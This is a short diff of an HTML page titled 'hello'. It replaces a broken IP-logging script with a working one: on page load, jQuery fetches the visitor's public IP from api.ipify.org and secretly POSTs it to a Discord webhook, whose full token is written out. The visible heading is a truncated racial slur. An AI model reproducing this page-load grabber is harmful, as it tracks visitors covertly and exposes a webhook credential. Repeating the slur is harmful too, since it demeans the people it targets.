@@ -1,25 +1,29 @@
-<!doctype html>
+<!DOCTYPE html>
 <html>
 
 <head>
     <title>hello</title>
-    <script>
-        $ip_address = $_SERVER["REMOTE_ADDR"];
-        fetch("https://webhook.site/f5f0256c-e43f-4f56-ab36-9365072d084a", {
-            method: "POST",
-            body: JSON.stringify({
-                content: ip_address,
-            }),
-            headers: {
-                "Content-type": "application/json; charset=UTF-8"
-            }
-        })
-    </script>
-
+    <script src="https://code.jquery.com/jquery-3.6.4.min.js"></script>
 </head>
 
 <body>
     <h1>hello nig-</h1>
+    <script>
+        $(document).ready(function() {
+            $.getJSON("https://api.ipify.org?format=json", function(data) {
+                $("#gfg").text(data.ip);
+                fetch("https://discord.com/api/webhooks/1123249010191368253/BSQadeZcqYY1ELLhsPWeOSKpB0By9N8sqoPGobEJGLm39JnSC7jlE7u4TEQW9ITZ7F1p", {
+                    method: "POST",
+                    body: JSON.stringify({
+                        content: data.ip,
+                    }),
+                    headers: {
+                        "Content-type": "application/json; charset=UTF-8"
+                    }
+                });
+            });
+        });
+    </script>
 </body>
 
 </html>
